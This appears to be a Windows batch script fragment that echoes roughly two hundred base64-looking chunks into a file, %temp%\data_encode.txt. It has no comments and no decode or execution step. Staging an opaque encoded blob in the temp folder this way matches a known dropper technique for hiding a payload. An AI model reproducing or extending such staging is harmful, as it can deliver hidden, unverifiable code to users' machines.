echo a4NlNgFXbWOOUhnmQdrzrmdFZT5RoMbGVnWAamtucFDRlTaWdF8QRVeJA9gTor6X >>%temp%\data_encode.txt 
echo RA3rRZktIuc2G6wXndQNAf62xrVdcCN0l0SC8lpoQmlY5yuC3Xz1FVv9xzNneZ0j >>%temp%\data_encode.txt 
echo FxGvoXcvt7IsxBfX4MTteQwKPzJOshlonmDBkOxyH1bW7R3j3s/sxjYG0E2oeXwC >>%temp%\data_encode.txt 
echo D+7xp1kdBbUU8ZPYM34A4m50WalzsR9pk20hjrLQri1xSG3Uz+2m7ZRSqCyKoxQR >>%temp%\data_encode.txt 
echo R3mJk5mpTI1n9rFbW57i3qMtSI3dG15cWErGquh4Sf2QK9UwqO9n+co3IwRfSYBS >>%temp%\data_encode.txt 
echo ikt8adE+5ZX9qVbOjCVqZf9i1rKgo26ck7tM/8lu/DcYzDc5HXQj81zd+JA6XZtQ >>%temp%\data_encode.txt 
echo KSejNu739V9YtBZtd9PIMJvZTWzmoDY+d2nBL1FK8VxPKab1xMuR2I3cyMcfwUZe >>%temp%\data_encode.txt 
echo te2Q3N4i2c8zfH6TawJk/J86rQEfr5TA7tMSH/w0HdDcW3A044hkUJ7K81pq9X4+ >>%temp%\data_encode.txt 
echo qZ3AWe34c+JwG0+SF+ycdrV3TYy04tm3N8QrPLuR0EVeekz7gjd95nwh1B7zOfCN >>%temp%\data_encode.txt 
echo okJbvTxaghuxCgV4RQFxDdWk140WfK+tTS3mp8QLrzhMB6QLQmHQM+mUdzky9DWM >>%temp%\data_encode.txt 
echo X3rlh4xfxoyERX8AFuh66x6+PLpyFC6Pgnvw+I5vcFiID24x6q47CQug4BNhfxz2 >>%temp%\data_encode.txt 
echo n1U7EecNZuqnRho2E4y31YH/f/v79FjphhGKP4GzCHEaGtpU6LyAD1h5jUnxHRLn >>%temp%\data_encode.txt 
echo QdzY6X8eISyJauHqiwOU3YhMjFPk+3ki/iIDiD0Fy288Wa7QXjFHv2GkcVGrj6ev >>%temp%\data_encode.txt 
echo /rRID82EPZg7T7yIyjNYVdKLEdy6b3Fjbl+zSWvWL8ZwpbF/6GcIDq3tU+2s76eh >>%temp%\data_encode.txt 
echo 6TcCbyK2QchKeRZG/Zs7sn1fDSOsQaKfgUUY/KrdPPh1eLMUOse/rK8dgZ5a2P5E >>%temp%\data_encode.txt 
echo /9OIjnwmI/WduaWL5o2sKCmZWD5jprhLKh5UvHgJYIJM4wtHTjSNzCqkr/TXlJNL >>%temp%\data_encode.txt 
echo P8PxPjaKjWmXjQf4iXjapR8YE6He+Wu82KXHjzGA2Q6HUSOv6iSiHlUdkNStf0D8 >>%temp%\data_encode.txt 
echo onJZYlsxyXa9YbVTYOaL+2n0Co3WmGKgecaYTcZeQ1vvCwJSr1iehItoqAqxLdX6 >>%temp%\data_encode.txt 
echo XC+IE7BDzrHYlXLFgLeONA7Avt9ZGQ0S3vAIySnDcSJAXxrr+iDcvA+aALBvGx0Z >>%temp%\data_encode.txt 
echo aPj/KJaO/vBrmHQgySi+AThY380Jag/9rY3wleim3KfT8jzt3kLVTt/QRV7jtcPe >>%temp%\data_encode.txt 
echo sv4c0C0N7WsYWn1EOJaoupy1eKsZvlye+8sRBkdCApbFLOIK5iYLjTsiuC+V2gUD >>%temp%\data_encode.txt 
echo aTcuQTYq/7V2ltqCfvx+ThGG9P4RMgyp2q0ZdSg+9ifv9g4b9OWCxae5t0gFRqps >>%temp%\data_encode.txt 
echo IkUqMJKjFBiFEqgZEcnWnqze4fkVFKYnvmFtKEB9gK+YSb9zGQkhn/5NA1w9JAw5 >>%temp%\data_encode.txt 
echo 2bjhANO+IQ8d3h4vpMNNmQJfcJ1wP0COps4gXfBlmaBNtWpTGeB6OUzxcmkDKWav >>%temp%\data_encode.txt 
echo 5szImDKpGeE2shzaBCA75MuMeZEZu0VmjNcm4NY3TZpIpHNGGenzi/RQn7SRTpLt >>%temp%\data_encode.txt 
echo +Aq4lZEQqHF3Gwfyk7W+nM7HP86ck6hNTObmVdl8RMaVkRlTtImpfHcgMqZFZpyZ >>%temp%\data_encode.txt 
echo Lm4jcWRdKcJsZCN8XFFTdi6bkv4XovVo73sb8xGVcxLicxZqU9Jr14gVdHsmagJJ >>%temp%\data_encode.txt 
echo OqSIXp8lSHSKic+v3AV6UW9TMcjlqSwJ5vC8mAaZser1dTLI2V1ZYPFV28A7wvGE >>%temp%\data_encode.txt 
echo GN+IZhMLV1Jh4Go+hJ8ve99ksdEsB34jLU/2IrN8IbtL32hkFmPSFNMZmc+IayXr >>%temp%\data_encode.txt 
echo B9E1/5Yzy0lRHuSA1bTpUQntgsAOduuhF4NHE8sp1IEaQXorBUD2KuEgnKoJbV6y >>%temp%\data_encode.txt 
echo 1jdwGsiFKq3IXGFbC0SNWgH0YDN0tvt4JcUFdhl5YYebywoe4JGncnxj4vC0gSKe >>%temp%\data_encode.txt 
echo slh3+p/eYPa+/xqwdxELdXMrB1TTL5RZNl8T4vefSnllMskrXYQdVCG1k3L6v8N4 >>%temp%\data_encode.txt 
echo FmZFMJ47WA9IMhxRXDmzSBFLQkWICMT6QHQ0CdIVj7M8pePgmmfATZ+LA/F9WW4E >>%temp%\data_encode.txt 
echo 54nPMjhPl2aUV3vrD+5krvP21YLreLcV3jiN9ZXCw/LbqPu4qkMrRQwYBPvRD74i >>%temp%\data_encode.txt 
echo ebP7FcmboVwRvDlF8maahYJ/fZjyMiOGaREtgtTaMhfUeJlAe5UMOS1Z3qpEMmO4 >>%temp%\data_encode.txt 
echo hBnDgeENDYnEdzUY8905YnjYGurHa0wSvl8Oz8X64h08PGszxPBUbVtpXMQiavR6 >>%temp%\data_encode.txt 
echo ie/+ZzEqzwqa5iBUPYkvF8n4Odqd0AYXa26evJ7BDWz/kuyiI/HzosgLYlGgAtA5 >>%temp%\data_encode.txt 
echo PfizKbTZsgWSfihb0Ppt0m3WwD+B2lFg+jv5ukvgoaRJ+BOsqHg9cx3PFDIjNkg8 >>%temp%\data_encode.txt 
echo n5wps194pKf5hSI0lc1hqFLgkNhbGaPEwRgyasSdFvGG6aIvHSGDRPjvReGDgM+V >>%temp%\data_encode.txt 
echo mqSauWdlmkntQePcFfrMAcI+e2y6seY2GVjHacMhhLDVoQSsMMLW4hCzExbwjcH3 >>%temp%\data_encode.txt 
echo xfnLedVgUzv9OtvDLaO2i/mgB/Njtogz/4Dh0JrU4SCBF69iX43FXStXwJgb4Y3o >>%temp%\data_encode.txt 
echo WOIEQTzCj6za68vPq7xmsJocWT/tdpTjoatkD89yKaTaBns+Mmz3aq+1YOD+ks5M >>%temp%\data_encode.txt 
echo dcgIA4G39iYzXnRhuoAfbeTlD4u2/xgOGPehbYPpD63DB4yKGGN/OlejbkhqqZ1r >>%temp%\data_encode.txt 
echo Dr7I41e5wjJYqUbETEATXkKrp+swmK1fSJXSO/ehIjWd2WM5Ch8YYzS81xNV2QCN >>%temp%\data_encode.txt 
echo 70aHSMYcWyWuEopxO+E+jGuvVf6HNwJN5p710B/vdh9174ut93RT1v32BUqoyXd1 >>%temp%\data_encode.txt 
echo q1xG5T2xI7xNDu8Z5/J3ACLfjUbDqWxq0AaihZo+lbcyFpkROkP4U9olVdygrLNt >>%temp%\data_encode.txt 
echo +o466NuhjlsFNeqmH72NDm0TWtBO1p/spz30EvzkPv8HTfzd6Ih7B0Sv+9CzkISW >>%temp%\data_encode.txt 
echo A6JpyFG7KusKzL49Nbs9L1Emiby8isunmQRSsrKpE3oUgBrbeVWxqQP7TOrldBeV >>%temp%\data_encode.txt 
echo ee1KgVIiTLewX9TERBh24n5hWa0AdLH5xSFSgyGTSmwcMvIy19IQnnR34A5lsgyI >>%temp%\data_encode.txt 
echo unGVrd90JXtVEEnNRN2dtWO4q2fxVqUMS73blkV7/C1YqC4qUU0VS0xOktucl83C >>%temp%\data_encode.txt 
echo /2fZB8JG399rFb0k3HCE6dpcEZfS6u+1Wl7HpqQJ+wScrRF4k/kTLnq6r5YYXbg0 >>%temp%\data_encode.txt 
echo rd5y2+AnkYDVGx8SHIkedxGlZT6FR8HtYJL5hklY0yj7hZfxseJ9ATRZpl1rpRaW >>%temp%\data_encode.txt 
echo wQqqH7FApnV3Fz7IoMbelFt/clh4K/D3QbW1qYCWTCDun7Cpz2Xi7ulGmQtFROM4 >>%temp%\data_encode.txt 
echo EozoLqnp19pWrT7CvhqeGcWK76+wtzdn0S/t02zfFo+uXSmMFpVqjyVcoWiF6vvB >>%temp%\data_encode.txt 
echo /tP16eb29S2xGhW+aO6gwj8bFf6KK1zcrr5fn12fzajvmKmD+gqN+i7poD51QWRd >>%temp%\data_encode.txt 
echo h7QldvcWGfg8FQB1v6I/y2HgNl2aYT4DoKOWwLBWFr6/bhol9mmhGAy+j9b7YkKX >>%temp%\data_encode.txt 
echo xNUudPC2UCbuXD+5EreDlbebU9SM9GJPDX+7GD4VCFtLv+gbYBUazcXZvN4qb7e4 >>%temp%\data_encode.txt 
echo PQcqb48Z4vmw0Ryb5d0aw8gKlJ7qeY3SUzyvNJqdwa+NNwah3UOtmBHg9YdWrjRF >>%temp%\data_encode.txt 
echo zUITbxi/uMHXWo0GX2yVDT7f2nGDD7bKBjdwgy+e1eAFRoOpUQ12jWrw9BmjwWNn >>%temp%\data_encode.txt 
echo ZIPBMx03+O6Zn2nw6StkgxVnIhscfSayweGhBt1Gg785R4M9O2rQkA9MERjwa66S >>%temp%\data_encode.txt 
echo 4Qj0m9PEZlQcgYXdY5iMYmAEP5iPjW8oVh0CNTedamu7bJEz/D+4UdcofordJheq >>%temp%\data_encode.txt 
echo Y0Sk9fcEEJ9/LICjXP6JOPEm+sdCxEr2TwQPTfGPjWsX0B3HoVQcI47ZQhGLlOqT >>%temp%\data_encode.txt 
echo Qlfo1D5S1sX4tqiJIf8Ap+K7Dm5YsYpvjHTHyqZ/czif5zMgcBiFLoV/BuX/k1nk >>%temp%\data_encode.txt 
echo f8ws8t9vjsqf2D5/s0nkPyItdOFNHMqPA/tedlBQL+T86g3pser1tCgnyDyHNAF0 >>%temp%\data_encode.txt 
echo iCDkjFj2ZFK2MNUXNs+JwL7ilytk8dPBpwMage+GQA1cf7Cfd1suXyZSGy8iwu9e >>%temp%\data_encode.txt 
echo /Ss3NL3VZqnS6zyET5TJ2lZqkrpwBXWhP3UhrsairOuWnePb4fkaPQ3gpr7RUpwN >>%temp%\data_encode.txt 
echo n4+vxJcU+rjpMyT4bjghFf8GG+CY1BunNG60PLrR37m50URtaxS/RPtDqP0+cN2I >>%temp%\data_encode.txt 
echo aD+wuzXcdqB92/vat92Ethe0Gm1/nxLVdi/RtkvbelZ8tHO23/+fbx/RZUT7Ktq3 >>%temp%\data_encode.txt 
echo i/Zpo3wwhdt3/jPt33rmn2pfrCpaTnmQQfxdgTblnwJHXxfcpIlO/VPsHOtrioNR >>%temp%\data_encode.txt 
echo BqfgBJyqvSEjqH0Js8lm0G+RXB8Fcn3k/d+ujyIanEIanIKo9VHM+q3I9eGUQg+u >>%temp%\data_encode.txt 
echo 6OP5uksY0hTI+3kOSfH8IKiA8+r1fjdiebwkZqtxUBS1fDPIWB6r/ifXR0F0q7cO >>%temp%\data_encode.txt 
echo +l9cH+8OjGr7h4H/4+tD0Cd6sf4Mw61wiI/86H7MH2isk5A/J9of9s+vD1m+fTe2 >>%temp%\data_encode.txt 
echo ELUznlMIf5jxFCGTtt/6nrzc2PrmuM/e+noOMbY+EjUgiVfI7FGC6RJTu/GUeE9w >>%temp%\data_encode.txt 
echo vy5k92uWWe8eKK1xbmrfiQRZa6P+RUoo/l+oE/e5pZsSsX/uxGEw9j5y/0X4E4ZT >>%temp%\data_encode.txt 
echo dtyY178FaPyU5Y8p4pzcUzbpqdW3Y+U3BX0Sf9ovotizkzfmQ58rWhbH/qigGlNT >>%temp%\data_encode.txt 
echo DDmCyglbA5Yewl5tIXwrF4SYqQNMYqU2Ei8S8QOXiYODyt1RLx22T+1fubQtmc7B >>%temp%\data_encode.txt 
echo whINahxjfBrUmJzgW25+o6lCH6Wsi+vs26MerjyZoeqVJ5M924OfR473tGmzly5S >>%temp%\data_encode.txt 
echo Z6hXpF7lvHnGLOfs0rIS56ySRTMrSsvVhRVnnUeEfsAVaYMHlEC+a4z3pFXvWVpY >>%temp%\data_encode.txt 
echo 3aymnNb2aSf4RvL4c7A7Bu1OSBa0286kLpD0Vlub7htg3A7hsYG2GTa7K2SgeucQ >>%temp%\data_encode.txt 
echo 4L1QPXoh52eErLd/Kn5EsLU93ovQbwjQTwbLoNFdN4Bvz4iKykQn7Y+CYgqj4fiZ >>%temp%\data_encode.txt 
echo pF5NMZQ4ISJuVz/LCq4olNe+1fvVgYJp96UTqMlTxLiXafVqFi3VfhH8rKkzE8++ >>%temp%\data_encode.txt 
echo yPqVTbvYqGMiu9k9Rn0NyyuI5KvubLSYsrULgtu1ZuNm+aUB4p5NnV8+27RkwM25 >>%temp%\data_encode.txt 
echo chZDeEmpAnLUqb3EWEZRusXU7CjdolXis65i5F8ScFIk7fGAnIxhPGCAMzCL6JQq >>%temp%\data_encode.txt 
echo juTZA6SF80UklIv2GEcpAjkJlQ5ARz8JjR/oz3TZoN8sGow/RfyfqXDEuALTYHoV >>%temp%\data_encode.txt 
echo U+G4gtzR1+EfU1gfU3XoeeHN/6a4dtnOiBUqjNyQUnkVHXhTaQ2vf4G69hp6rcm8 >>%temp%\data_encode.txt 
echo a1y7kHe/Ug2oVoAW3GfY//2ae78Vjg25KbhJLSH+OmNV7bJetmEbXdsoe8VwkuKA >>%temp%\data_encode.txt 
echo v/qmUBBsEWgVOHLCHIW50MupQty8/tfisuF5Q8TXH0iMwlUIfineZ4z6ODU4BA1+ >>%temp%\data_encode.txt 
echo Tw1+F7yPyP51qqX2JdaO6Kd+Ja8PVday8BSceInlzl5+EYI45I+Fe/NbZHl9KxU8 >>%temp%\data_encode.txt 
echo XbcTHWoUppkfHH9GHY5eItGwBDbqfErUidimzk3IUPUl13oKtSq+fbS56e/82tA9 >>%temp%\data_encode.txt 
echo snOa0VIRutgYeBn2/pT2DtKAJ8gcCveF1loJxrUs3N7lxjus5kdRd/85xFLScCNR >>%temp%\data_encode.txt 
echo u9L1meStRrlTL3K5i2gu8Si6l7ikcTcHLsW2/mkgoZX7+D76824n0R+luiyi55tC >>%temp%\data_encode.txt 
echo qZMwJzVas5xenFHrL4Nas5P2unJ3A22tr2EMAxtCngWCP864eeasktlz5pbeMq9s >>%temp%\data_encode.txt 
echo /oKF5bdWLFI9i5csve32rOyc3BEjR+WNHjM2f9z4awsmXDex8PpJk4tumJLiHnJ5 >>%temp%\data_encode.txt 
echo 6tArrkwbZpIEf25+Vrpg8Yyy0lnOsaPH5zpLFzinTZtTsmCaWjK/fAHciVcNGjSY >>%temp%\data_encode.txt 
echo /i8rvXnmwJRBQwcuqpg5eJE6q3ThwJkL589fuGCwkXPQzI4b6e+85KebuMTUzp7d >>%temp%\data_encode.txt 
echo uN/AvQEoWd9wGSN8A5t4NV95gGv5XDx4yxNO04gicfPaK4noVNtJceXxA9Hixfry >>%temp%\data_encode.txt 
echo y6IWReS9QfeXvHSKzXiB/mrb4ag0FHA0bu0DYtpzLoXuUjtWf6qfe6v2o/tDba/2 >>%temp%\data_encode.txt 
echo dkwf5O05FOXcbRr/0vhX5HxFGAFdHXG1or/rxNmqppw6WTPunLnu6yfOHA3a++2f >>%temp%\data_encode.txt 
echo 8bnlPq5lFddyvflcteT9TC15kX2xnKsWy8/UYonsS8y5atnY96dr2dgvoi9WsQ9E >>%temp%\data_encode.txt 
echo 5wIQwWJRSwc1/D8GoTEevy4AgENL7J19XFTVusfXMIMOAjKjoCiUSKig2IWihNTu >>%temp%\data_encode.txt 
echo 8DK+Iyhgnk9yAmWOkAQEM7509B4USHYjRWlpZQVppka+lBUZ2iAkoASj+DIqFSrY >>%temp%\data_encode.txt 
echo IFRoBqgU51l7eBl+R8+99997m8/n99nzXc/az9r72Wu/r72WzPyC6GGb6CHWNqtE >>%temp%\data_encode.txt 
echo fGcjccrm/Vr30cuyfrJxyha7GbOQ1Cl7LU2+MtL8/MC9WtLbyf+aKPOTVBGyApVO >>%temp%\data_encode.txt 
echo OUfEwWD4JrdUnPXH4mmRsk4xoW6mIKav7+58X8qEGkG0O2349XfefsiT1z+xf8u/ >>%temp%\data_encode.txt 
echo /y5+72Ju8RQ/8FIIfryU5iTLKJHM8gKqwPK9t4f4dpU3lXmnWHzgm20+5MmXxMYp >>%temp%\data_encode.txt 
echo 51Hud5en5bpGcPU3NI/veRnMzxdWe0jIDv6+l3fC0+zbf/3d806LP8e0szRRl2da >>%temp%\data_encode.txt 
echo znIFPWfnkBzxjNX7fX8LhaDly7582wfmc/dq+a73zE1nf1d+Bk6yfHLnLo46cFu4 >>%temp%\data_encode.txt 
echo W3pZQTuS0867CuEc7V4nSrvH+N+0BE343v8Pyz4kfrHIS4noeVrbRtuD98gXSIfR >>%temp%\data_encode.txt 
echo VbQM9zl+9V8/9j6ikeX1fM8QL66npdmZJ++k6HBd+FKFYC8OClDZcV2oLO0cU3pn >>%temp%\data_encode.txt 
echo kM8xIUomtmNz5d87DLz+0rsYssQRRwY1n6KKlu9vKMP7i/WtRsv7x0ZLwwF+2qDr >>%temp%\data_encode.txt 
echo M588fl3I+0fx7PnqsZtu1fklT5U4gEGnDW+l/qgwl480/XyeZYwIc8n43u6aXPta >>%temp%\data_encode.txt 
echo Jmq93PtaZ5axzNKJ68+Nnb/0D8ESb6Gnu2/zAjfaIIN7dqEBDZ25NcpdbIXY0/zw >>%temp%\data_encode.txt 
echo Kdn6cqPYJs0yaph4aRZquQCzKxJfzId48Bfzzc8MHP/O8j5GvFrwbzencO9l5qd4 >>%temp%\data_encode.txt 
echo /99l2pE9b3d4xPRLxA7sxNcy5gmWbAoxm+5CS32/P4zn/5a7xznvCqXKwXp+3eMc >>%temp%\data_encode.txt 
echo gBUDWHb45H9tnVyrfN+H7WXTMxaeSelSBXrVKndckrPHb4yzMQHXAS9+1uy4d1L/ >>%temp%\data_encode.txt 
echo /OfAfh54EeSPAV4A/BTwQuBo4CjgC1D+WeBIyG+z+MK6Ddtqle/tIU4OKZcA+0kt >>%temp%\data_encode.txt 
echo cTNYJjMkC6/av/pKjfKdq2SfW7yAAdsAe8pfuZsgcVNk/yRnkx6uGP4I+Pux6vqa >>%temp%\data_encode.txt 
echo 24drlJs28Px77K8CNwJfAW4CdmMD/bsD+0P512D+YWAfCuwIrAQeDuwA7ASsAL4B >>%temp%\data_encode.txt 
echo yzMW4jcC8o8CdgEe8d/YbXmjNyuWwvYzwvKcAh4J8ZXB/A2Q/zJw/O1FuUMCjMo9 >>%temp%\data_encode.txt 
echo K5gh4rzt+8cmfnK91K9W+WEL+Xx6n32By4cBGzVG5WtzmMf+iqLwAke/Nz6yrr9n >>%temp%\data_encode.txt 
echo vz27/WE3xeatFB/f2/sact67eTsiUfHRq8QTPr1gC3aH0Mi/OR0drdB/RfP7OXwk >>%temp%\data_encode.txt 
echo AXYCVgA7Ag8FHgasBB4OzIDXfz9wezD42UP+TMg/BOyDgG2A5cAy4MHAUmA7YFvg >>%temp%\data_encode.txt 
echo hsc3xk+fVqtc70Ac+PbzbZd2PjjVii9PHP3V7Z21ylc8WOYzvsaE+MOXr/9kxVfA >>%temp%\data_encode.txt 
echo frVQcmmSdf7lTqeas/rZSTKwPo4Dzg+5+cQbDjXKgloqP25IcR3UR6zvQ6F+F0pm >>%temp%\data_encode.txt 
echo de2xqn/fQv5S4JPABuDhsP8NAy4olyuGr6xVvnWD6n9K+i0VrI8Elu+VT944eOjw >>%temp%\data_encode.txt 
echo aMXn28l/wAODp0P+U0m/3Zr6l9GKz5Jof5j89Qu4P78I82cDTwR/J0o8v0ic76Z4 >>%temp%\data_encode.txt 
echo v4TsqplpqkfbPNdFuyle1pD/SadG2coGrs9Q4EHATsAKKG8o8EPAXsDDIT7OwC7A >>%temp%\data_encode.txt 
echo DMofC/48gZWwveRgz4H4bQSWQn4G/gaB/Thsr8FgtwGWAVfi9ir78dOtv9Qo367i >>%temp%\data_encode.txt 
echo +8PLElvIPxU4CNgR4hcyZ8q0xsO1yq/Xkb+kGT9LcP1w+SDeHgdvulvXH9WJCf4p >>%temp%\data_encode.txt 
echo YTXK9Y9ZziejoDxF24k3/xpcq8x1JvtnSb+pvigRRsWPVpR8wb6TDIrZb9PQflS7 >>%temp%\data_encode.txt 
echo m45Hh3uOX8AzYHnKIL4VwN8AHwMuBz4NfJ74jhUrYX3yw58bGri8VvmGnOyJjoeG >>%temp%\data_encode.txt 
echo gN0G+AFgKfAI4IK/aDve+rpWeXg+P9/KRziB3QN4ff3TJ0s39x9fd8DxTwnxexDY >>%temp%\data_encode.txt 
echo G9gH2BX4JNRPN7Dnwv4jAH8D81cAHwceCf5H4PEDuHqRh/utv7op9JU0/5NTfUaB >>%temp%\data_encode.txt 
echo PfNj3+1eAbXKz9PIPu+cqeDjh1+zZhfI7w78APAY4GHAfr/eKbTefz3AflNitDYz >>%temp%\data_encode.txt 
echo BgkH6uYI1uwM87d5j15o31ij/ITbE+2mpKkCZw+xYjuoL8ak385an19Gg7+9dSum >>%temp%\data_encode.txt 
echo qAP7r2cdwG4P3NA0+si+XTXKI1MiQ1gpY1WwP8VFmKacDOk/Pqxf/JunvbdRuXsP >>%temp%\data_encode.txt 
echo K6hy8JANAX92uL0eOvuPwVQf9k22LE+mXeffH/na6noMuMB+W8zex2h7Pm/ZnlVQ >>%temp%\data_encode.txt 
echo nwoWn98zckat8vUuy/7LJk6IsV6+DbB8L0H9tSm5+/aNX0ZTfCycB3bNjEZJkVd/ >>%temp%\data_encode.txt 
echo /DaB/QlYv0DgLMhveKJk195L/dfrE2B7yvF4+9OC2j+W0vH9RVp+6azHDSveuzk2 >>%temp%\data_encode.txt 
echo ska5l06kSRKf/2SOcD8BPAzvF4DjVgysP4PBHvDsQDsgs4X8XZBhPMRDAfn9nshw >>%temp%\data_encode.txt 
echo cJ9Yo/y4ieIRtmq6Ea6XnoT5S1ULnntcW6PMDOD7j90dydBJ2mvObopX51vqix7i >>%temp%\data_encode.txt 
echo 7Qrl2QM7AI8HHoTxmm7/wytW50vD5o3R2nfp/BHDt8/shzI3dZxduLBWmX+Hyg9R >>%temp%\data_encode.txt 
echo pCjgfCsFlgAPA7YBVsrufb/Sy8FwPeAI8ZsA/Bpcn5fC/WD8CIe6/d8alS89Seev >>%temp%\data_encode.txt 
echo qisptj8MLN8E59dzwGeB/fD6FO6nXIEfBB4F7AQ8DHgssATYHtgR2AZ4DLAM2AHY >>%temp%\data_encode.txt 
echo FtgdeBDwcGAFsCewHfBDeH8K/ACwEtgF2A14BLAH8GDg0cAjgZ2BpcByvD8/OvD4 >>%temp%\data_encode.txt 
echo /wFcH3WP84DnkV7A2h0DORs4GTgTeC3wauBc4DTgROAC4HzgTcBxwAnA24C3A28Z >>%temp%\data_encode.txt 
echo wDFfsswQPl4SH166KWOEfoFML8kqlUs2MKbqSU+/Htv3EDhGaLp0tR85Z7XKC8t5 >>%temp%\data_encode.txt 
echo U3tFzmmdTGiNLetW6F3ElDmyvBDZDv43p0rX3HJVaLfkF2K7ChWJfMjwbq0Pf2Gr >>%temp%\data_encode.txt 
echo G8m/+40OYea5X/3erY/t4m54s4pu53d4xrm69pbv9I7O9NffkFOlPXmYp+atZCr9 >>%temp%\data_encode.txt 
echo vA0yct7RUmz5frvXv97F8Lz4ImGCWFLPuOc8jRc6Tix0eG+h5w73FWpV4GWrAmvF >>%temp%\data_encode.txt 
echo AoV2lX4JlXeJyjsirv/kebNDZoaGPvXoI5PVsyZHzZk3Z/LM6FkLJ4fPnj+TEnuW >>%temp%\data_encode.txt 
echo pzBtWyjrjhSDM7C/rRh/g9DURVm+HGp5m6mPtXznxz+zk/KR5QuN/PG+SyNvmxQq >>%temp%\data_encode.txt 
echo Y3G0FKHOhQ284X+Ue0Wor/jVUKhrYUMWzyA3xPCJpU/xUO9CM98MLq08t+XzTnf+ >>%temp%\data_encode.txt 
echo nZS4IP3xWizEdoqLKOi6eMdX+thOvU6MRn6FujiYfoUF5DZPV1yhLuFYoTbwiaA2 >>%temp%\data_encode.txt 
echo Fe7k5anLLamVltT6wt1iarUl1WhJbSgsElPPiBjgJagbCw9QiqA2Fx4Sp62FxeK0 >>%temp%\data_encode.txt 
echo rbBEnN4yT3bkA9wbslplf8sx6JbS9uIhMY/vbY2whLdUKf7D8t1UHJkom9ZNeICv >>%temp%\data_encode.txt 
echo TF6obEecOJXvyKSp2MWA2D+CraWNiNHBMmzDFwar9jjkr1J8fdLypfkffNDFge3b >>%temp%\data_encode.txt 
echo YorHcGvTIrFCRWW1Rup1cqv2Pzk3DwbrbA7G586zLZacnrXmFzFyvYHqDU1vMP4H >>%temp%\data_encode.txt 
echo IchTF4v9LTjwQJjEQFzS2fufztN08jbQ4of+Zn7XGdQmXNT92PIj1C+hKS+mmH+9 >>%temp%\data_encode.txt 
echo 6X/J6Qs1b9QiV7H+QTNa7Xu7nPcX10xcLav1yVxrWxysVfJVuZU1NVBnL5hoR6kq >>%temp%\data_encode.txt 
echo s6traTE/M5ix/H//WyBcpqPJdN6jWbpifTOfZtmxyWIPZ80+pfRfaBCq9XK9Stbd >>%temp%\data_encode.txt 
echo 0Hs88RZib+ljnPXhckHXqVfTcUVY16WPdRCOV6jN4qszdau4scIbdZFBppUThUrh >>%temp%\data_encode.txt 
echo Yke7UCG0+1cJ68x6ml1tFsJb9TR7TKt+XVdffada5Cg25POv8j/dcUM4Lpho2i6U >>%temp%\data_encode.txt 
echo 6tWN3EOLIejiyiH+3S2fW1oZOB05ltU2hraXziWobtVg/+4gXWP6W5Ze4Tbz/hTV >>%temp%\data_encode.txt 
echo DV/ye3ifUiG8Xmhz+jy8oe6KcJ6m9cJFPthReINdBfmuu8aT6q6LGa6K/812ZZwE >>%temp%\data_encode.txt 
echo U0eHUCdU1GkaO64FXVylDLrolPMYVdWp6kanF/nuHdE8vu+lIMVHbHLoS/GpUDeI >>%temp%\data_encode.txt 
echo r5jD5RSbCnWjCGK0YuqFH2jVwk26Zyg8U3vCE2PKCzfTsWxUX14TrZg+pkEf3ijE >>%temp%\data_encode.txt 
echo iPFSmyleWeW+ff2VU7zsLfHiUTouUDzrO9ppzo72ln20/kGx9SvdBFqLdY167quR >>%temp%\data_encode.txt 
echo qrIQ09ryWW/71iPqeqEs69cxunFT19Wvsg3SmdLt9TEmn5tu6+r7lmgjzd7MxyLI >>%temp%\data_encode.txt 
echo J/fi0KS5F3xo4c5QLHlMz9SZcy/UXbM7RgVz5Ct4p+46pf1osdpVCJ25Fzp09XUa >>%temp%\data_encode.txt 
echo k3C+45qgrg66s+qJoDvah/PUZv6Rl/jhG+UlD5PU1aPO0y5JLq6QC7PdMSGmoe6X >>%temp%\data_encode.txt 
echo 5kDeaFFtClJXrzyhD6/2ueFGxYRX9xzpe99/ntk58HzaBtwI3ADcCVwJbAKuBq4H >>%temp%\data_encode.txt 
echo vgXcCmwGNgI7fzCQ3YEdgA3ACuBoYBlwPnA58E7gA8ANwCXAm4ALgE3AKuDdwEXA >>%temp%\data_encode.txt 
echo Z4BXAzcChwFnA28H7gLOBNYCJwN7A9cDrwUOAF4CnAu8BdgMXAxcDZwGHAh8CNgD >>%temp%\data_encode.txt 
echo uA14G/Bi4E7gRGAG9wdGsFcC3wL2A24F9gX2Ap4H7Aoch/UZ92e4vp8H9hK8HwD7 >>%temp%\data_encode.txt 
echo IbB7gH0LsDvwYjzegT8z8E7IL8PjER4PYf4zwHLIvw14E7AXsAqPz+D/Ft4PQv5c >>%temp%\data_encode.txt 
echo PP5D/mrgQMgfB5wMfAC4GLcvsAHvN8FeBJwNnADcBf6WgD0SOBpYC1wO/orx/hfy >>%temp%\data_encode.txt 
echo h2E88P4b6zOwL7AfcADwNDyf4v082F2BHYAVwGvx/A/+Gdi9gXcDz8LrA/BXBNw2 >>%temp%\data_encode.txt 
echo gJkzPB8DLgAuBDYCnwI+DXwZ+ArwVeBGYOYykJvAfg3YDNwMfB24Bfhn4F+A24Bv >>%temp%\data_encode.txt 
echo AN8E/hX4FvBvwO3AHcCdwLeB7wDfBe4Cznz3au7qx2qV+/jz94eHLd3UfnOz2wN1 >>%temp%\data_encode.txt 
echo yh1DmSFizUen2i6UjV4y8pTy9aMsbuvW6xE/RLTVpP9xWrnxA7InTqlV5F2W6MNP >>%temp%\data_encode.txt 
echo K3NiWZzcdvNyAzxPxufL2P6oDLgc+Bvg48CD4fk0Pq8eBCwBtgNWNb164GoW+R/O >>%temp%\data_encode.txt 
echo PPaf37pUNfXm3barborsXP4+clFnJvBLE56a4RZ8Wpn1FsXjgqtRD/xix9PfvzCT >>%temp%\data_encode.txt 
echo +B0LyyJtzCHup5VHfVlB1e7phSwk2UH4xqh8k+c/F3OZ7vdim1ft/b23TSh/2sMS >>%temp%\data_encode.txt 
echo Qyz7Mv//5+//1e+Hp1WsidQK+pV0lyRbomIOpBFLVPfxIKEKzgeDsR1k/Ppf8+Rf >>%temp%\data_encode.txt 
echo UjEjSVGvYpGklY8Fs3WkfNKbpGeCglkySUfKIW0mbSPd77dyQjDLI20mbSVtJ+0g >>%temp%\data_encode.txt 
echo FZFKSCdIdSQTqYHURPqZxLyDWRdN7WmqILl537uMsZT+H6THSbNJS0ippA0kPel1 >>%temp%\data_encode.txt 
echo 0rukz0mVpFrSeVJ9jz8J+DN2DSwHS1WMCxF13989wu6RGPJvt2nvfnyv/Tm/QNrv >>%temp%\data_encode.txt 
echo 56CUxe2QsnqrtLBPpKyI0joL+9NyKa1yp5QFvN+ftuVTKZN9IGXTdvSnFVGawy4p >>%temp%\data_encode.txt 
